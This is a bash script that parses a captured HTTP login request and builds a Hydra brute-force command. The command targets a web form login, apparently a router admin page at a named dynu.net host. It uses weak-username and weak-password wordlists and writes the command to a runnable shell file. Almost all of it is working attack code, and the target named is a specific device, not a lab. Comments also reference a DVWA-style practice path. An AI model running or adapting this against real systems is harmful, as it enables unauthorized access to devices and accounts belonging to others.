#!/bin/bash

# replace belows with your own contents
REQUEST_URL="POST http://cysoo.dynu.net:8080/goform/mcr_verifyLoginPasswd?UserID=USER&Password=PASS&IpAddr=123.111.154.37&DnsSvr1=210.220.163.82&ConnMode=DHCP&LinkSts=Connected&SwVersion=1.02.09 HTTP/1.1"
COOKIE="Cookie: (null); language=kr"
RESPONSE="/start.asp"

# CHECK USER & PASS files
WEAK_USER_FILE="/home/armian/webhack_storage/PROJECT_K/WEB_CHECK_SCRIPT/weakuser.txt"
WEAK_PASS_FILE="/home/armian/webhack_storage/PROJECT_K/WEB_CHECK_SCRIPT/weakpass.txt"
#WEAK_USER_FILE="weakuser.txt"
#WEAK_PASS_FILE="weakpass.txt"

# SET THREAD COUNT
THREAD_COUNT=1

HYDRA_SHELL_SCRIPT=11.RUN_HYDRA.sh

# GET | POST
#echo ${REQUEST_URL} | awk '{print $1}'
METHOD=`echo ${REQUEST_URL} | awk '{print $1}'`

# http | https
#echo ${REQUEST_URL} | awk '{print $2}' | awk -F":" '{print $1}'
HTTP=`echo ${REQUEST_URL} | awk '{print $2}' | awk -F":" '{print $1}'`

# HOST (172.16.244.131)
#echo ${REQUEST_URL} | awk -F"/" '{print $3}'
TARGET_HOST=`echo ${REQUEST_URL} | awk -F"/" '{print $3}'`

# PORT OPTION
NEW_TARGET_HOST=`echo ${TARGET_HOST} | awk -F":" '{print $1}'`
NEW_TARGET_PORT=`echo ${TARGET_HOST} | awk -F":" '{print $2}'`
#echo "    TARGET_HOST=${TARGET_HOST}"
#echo "NEW_TARGET_HOST=${NEW_TARGET_HOST}"
#echo "NEW_TARGET_PORT=${NEW_TARGET_PORT}"

if [ ${TARGET_HOST} =  ${NEW_TARGET_HOST} ]; then
    TARGET_PORT_OPTION=""
else
    TARGET_PORT_OPTION="-s ${NEW_TARGET_PORT}"
fi

#echo "TARGET_PORT_OPTION=${TARGET_PORT_OPTION}"

# URL_01 (/vulnerabilities/brute/)
#echo ${REQUEST_URL} | awk -F"?" '{print $1}' | sed "s;${TARGET_HOST}; ;g" | awk '{print $3}' 
REQUEST_URL_01=`echo ${REQUEST_URL} | awk -F"?" '{print $1}' | sed "s;${TARGET_HOST}; ;g" | awk '{print $3}'`

# URL_02 (username=USER&pass=PASS&Login)
#echo ${REQUEST_URL} | awk -F"?" '{print $2}' | awk '{print $1}' | sed "s;USER;^USER^;g" | sed "s;PASS;^PASS^;g"
REQUEST_URL_02=`echo ${REQUEST_URL} | awk -F"?" '{print $2}' | awk '{print $1}' | sed "s;USER;^USER^;g" | sed "s;PASS;^PASS^;g"`

echo "METHOD=${METHOD}"
if [ "${METHOD}" = "GET" ]; then
    echo ${METHOD}
    echo "get"
    REQUEST_HTTP="${HTTP}-form-get"
else
    echo "post"
    REQUEST_HTTP="${HTTP}-form-post"
fi

cmd="hydra ${TARGET_PORT_OPTION} -L ${WEAK_USER_FILE} -P ${WEAK_PASS_FILE} ${NEW_TARGET_HOST} ${REQUEST_HTTP} \"${REQUEST_URL_01}:${REQUEST_URL_02}:${RESPONSE}:H=${COOKIE}\" -t ${THREAD_COUNT}"
echo ${cmd}
echo "echo ${cmd}" > ${HYDRA_SHELL_SCRIPT}
echo ${cmd} >> ${HYDRA_SHELL_SCRIPT}
chmod 755 ${HYDRA_SHELL_SCRIPT}
